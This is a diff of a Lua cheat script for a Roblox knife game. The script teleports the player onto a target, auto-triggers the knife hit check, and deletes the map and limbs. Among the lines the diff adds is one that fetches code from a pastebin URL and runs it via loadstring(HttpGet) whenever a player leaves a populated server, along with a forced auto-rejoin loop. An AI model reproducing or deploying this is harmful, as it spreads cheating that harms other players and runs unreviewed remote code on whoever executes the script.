@@ -66,18 +66,18 @@ end)
 game:GetService("RunService").RenderStepped:connect(function()
     if game.Players.LocalPlayer.PlayerGui.ScreenGui.UI.Target.Visible == true then
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace[game.Players.LocalPlayer.PlayerGui.ScreenGui.UI.Target.TargetText.Text].HumanoidRootPart.CFrame * CFrame.new(-2, -1.5, 0)
-        game.Players.LocalPlayer.Character['Left Arm']:Destroy()
-        game.Players.LocalPlayer.Character['Left Leg']:Destroy()
-        game.Players.LocalPlayer.Character["Right Leg"]:Destroy()
-		game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
-        game.Workspace.GameMap:Destroy()
-    end
-end)
+        game.Players.LocalPlayer.Character['Left Arm']:Destroy();
+        game.Players.LocalPlayer.Character['Left Leg']:Destroy();
+        game.Players.LocalPlayer.Character["Right Leg"]:Destroy();
+		game.Players.LocalPlayer.Character["Right Arm"]:Destroy();
+        game.Workspace.GameMap:Destroy();
+    end;
+end);
 
 
 local Player = game.Players.LocalPlayer;
 
-local cooldown = false
+local cooldown = false;
 
 task.spawn(function()
     game:GetService("RunService").Stepped:connect(function()
@@ -85,13 +85,36 @@ task.spawn(function()
             if Player:DistanceFromCharacter(game.Workspace[game.Players.LocalPlayer.PlayerGui.ScreenGui.UI.Target.TargetText.Text].Head.Position) <= 6.5 and not game.Workspace:FindFirstChild(game.Players.LocalPlayer.PlayerGui.ScreenGui.UI.Target.TargetText.Text).ForceField then
                 Player.PlayerScripts.localknifehandler.HitCheck:Fire(game.Workspace[game.Players.LocalPlayer.PlayerGui.ScreenGui.UI.Target.TargetText.Text])
                 coroutine.wrap(function()
-                    cooldown = true
-                    task.wait(0.75)
-                    cooldown = false
-                end)()
+                    cooldown = true;
+                    task.wait(0.75);
+					cooldown = false;
+                end)();
             else
-                task.wait()
-            end
-        end
-    end)
-end)
+                task.wait();
+            end;
+        end;
+    end);
+end);
+
+game:GetService("Players").PlayerRemoving:Connect(function()
+	if #game:GetService("Players"):GetPlayers() >= 4 then
+		loadstring(game:HttpGet("https://pastebin.com/raw/QzKkcxcb", true))();
+	end;
+end);
+
+
+local lp,po,ts = game:GetService('Players').LocalPlayer,game.CoreGui.RobloxPromptGui.promptOverlay,game:GetService('TeleportService');
+ 
+po.ChildAdded:connect(function(a)
+    if a.Name == 'ErrorPrompt' then
+        repeat
+            ts:Teleport(game.PlaceId);
+            wait(2);
+        until false;
+    end;
+end);
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Credits",
+	Text = "Scripted/Coded And Edited By ng#9906, Credits To Supa And Tech Hog And Not Same Servers (Whoever Made It) And Sustor."
+});
